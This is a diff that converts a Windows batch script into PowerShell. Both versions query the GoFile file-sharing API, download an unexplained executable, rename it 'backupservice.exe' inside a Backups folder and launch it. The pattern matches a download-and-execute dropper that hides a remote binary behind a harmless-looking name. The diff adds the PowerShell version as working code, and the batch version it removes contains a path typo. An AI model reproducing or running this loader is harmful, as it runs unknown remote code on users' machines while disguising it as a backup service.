@@ -1,23 +1,32 @@
-set CONTENT_ID=SplUgh
-set OUTFILE=r.exe
+# Variables
+$ContentID = "SplUgh"
+$OutFile = "$env:USERPROFILE\Downloads\r.exe"
+$BackupDir = "$env:USERPROFILE\Backups"
+$BackupFile = "$BackupDir\backupservice.exe"
 
-echo Getting file info from GoFile...
+Write-Host "Getting file info from GoFile..."
 
-curl -s https://api.gofile.io/contents/%CONTENT_ID% > response.json
+# Download JSON response
+$response = Invoke-RestMethod -Uri "https://api.gofile.io/contents/$ContentID"
 
-for /f "tokens=2 delims=:," %%A in ('findstr /i "downloadPage" response.json') do (
-    set URL=%%A
-    goto download
-)
+# Extract download URL from JSON
+$URL = $response.data.contents | Where-Object { $_.name -like "*" } | Select-Object -ExpandProperty downloadPage
 
-:download
-set URL=%URL:"=%
-set URL=%URL: =%
+if (-not $URL) {
+    Write-Error "Download URL not found!"
+    exit
+}
 
-echo Downloading from %URL% ...
-curl -L "%URL%" -o %OUTFILE%
-cd "C:\USers\%USER\"
-md Backups
-cd Backups
-move "C:\Users\%USER%\Downloads\r.exe" "C:\Users\%USER%\backupservice.exe"
-start backupservice.exe
+Write-Host "Downloading from $URL ..."
+Invoke-WebRequest -Uri $URL -OutFile $OutFile
+
+# Ensure backup folder exists
+if (-not (Test-Path -Path $BackupDir)) {
+    New-Item -ItemType Directory -Path $BackupDir | Out-Null
+}
+
+# Move and rename downloaded file
+Move-Item -Path $OutFile -Destination $BackupFile -Force
+
+# Run the backup service
+Start-Process -FilePath $BackupFile
